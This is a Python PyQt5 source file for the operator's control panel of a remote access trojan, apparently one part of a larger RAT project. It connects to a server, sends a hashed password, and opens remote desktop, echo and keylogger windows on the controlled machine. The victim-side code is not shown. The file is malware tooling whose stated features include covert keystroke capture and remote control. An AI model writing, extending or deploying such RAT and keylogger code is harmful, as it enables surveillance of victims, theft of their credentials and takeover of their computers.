import hashlib
import socket
import struct

from PyQt5.QtCore import QThread, pyqtSignal
from PyQt5.QtWidgets import QLabel, QWidget, QPushButton, QDialog, QVBoxLayout, QLineEdit, QHBoxLayout

from RATConnection import RATClient
from RATFunction.EchoUI import EchoUI
from RATFunction.RATFunction import Side
from RATFunction.RATFunctionRegistry import RATFunctionRegistry
from RATFunction.RemoteDesktopUI import RemoteDesktopUI
from RATFunction.MyLoggingUI import MyLoggingUI


class AdminNetworkThread(QThread):
    received_packet = pyqtSignal(bytes)

    def __init__(self, client: RATClient, host, port, parent=None):
        super().__init__(parent)
        self.client = client
        self.host = host
        self.port = port

    def run(self):
        print("running network thread")
        self.client.packet_callback = self.handle_packet
        while True:
            try:
                print(f"attempting connection to ({self.host}, {self.port})")
                self.client.connect(self.host, self.port)
            except:
                return

    def handle_packet(self, data):
        self.received_packet.emit(data)


class AdministratorControlPanel(QWidget):

    def __init__(self, function_classes):
        super().__init__()
        self.setup_ui()
        self.client = RATClient()
        self.registry = RATFunctionRegistry()

        for function_class in function_classes:
            self.registry.add_function(function_class(Side.ADMIN_SIDE, self.client.packet_queue))

        self.setup_echo()
        self.setup_remote_desktop()
        self.setup_mylogger()

        self.reconnect()

    def setup_ui(self):
        self.setWindowTitle('Administrator Control Panel')
        self.setGeometry(100, 100, 400, 150)
        self.layout = QVBoxLayout()
        self.setLayout(self.layout)

    def add_button(self, button):
        self.layout.addWidget(button)

    def setup_network_thread(self, host, port):
        # create a network thread and start it
        self.network_thread = AdminNetworkThread(self.client, host, port, parent=self)
        self.network_thread.received_packet.connect(self.gui_handle_packet)
        self.network_thread.finished.connect(self.reconnect)
        self.network_thread.start()

    def reconnect(self):
        dialog = QDialog(self)
        dialog.setWindowTitle('Input Dialog')

        # Create a label and text input field in the dialog
        label = QLabel('Enter password:', dialog)
        input_field = QLineEdit(dialog)

        # Layout the label and text input field in the dialog
        layout = QVBoxLayout()
        layout.addWidget(label)
        layout.addWidget(input_field)
        dialog.setLayout(layout)

        # Add OK and Cancel buttons to the dialog
        ok_button = QPushButton('OK', dialog)
        ok_button.clicked.connect(dialog.accept)
        cancel_button = QPushButton('Cancel', dialog)
        cancel_button.clicked.connect(dialog.reject)
        layout.addWidget(ok_button)
        layout.addWidget(cancel_button)

        # Display the dialog and wait for user input
        if dialog.exec_() == QDialog.Accepted:
            # User clicked OK, get the user input and continue
            self.password = input_field.text()
            self.client.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.client.connected_callback = self.send_password
            self.setup_network_thread("localhost", 8888)
        else:
            exit()

    def send_password(self):
        hash_object = hashlib.sha256()
        hash_object.update(self.password.encode())
        self.client.send_packet(struct.pack("I 2044s", 0, hash_object.digest()))

    def setup_echo(self):
        self.echo_button = QPushButton('Echo', self)
        self.echo_ui = EchoUI(self.registry.get_function(1))
        self.echo_button.clicked.connect(self.echo_ui.show)
        self.add_button(self.echo_button)

    def setup_remote_desktop(self):
        self.remote_desktop_button = QPushButton('Remote Desktop', self)
        self.remote_desktop_ui = RemoteDesktopUI(self.registry.get_function(2))
        self.remote_desktop_button.clicked.connect(self.remote_desktop_ui.show)
        self.add_button(self.remote_desktop_button)

    def gui_handle_packet(self, data):
        self.registry.route_packet(data)

    def setup_mylogger(self):
        self.mylogger_button = QPushButton('Keylogger', self)
        self.mylogger_ui = MyLoggingUI(self.registry.get_function(3))
        self.mylogger_button.clicked.connect(self.mylogger_ui.show)
        self.add_button(self.mylogger_button)

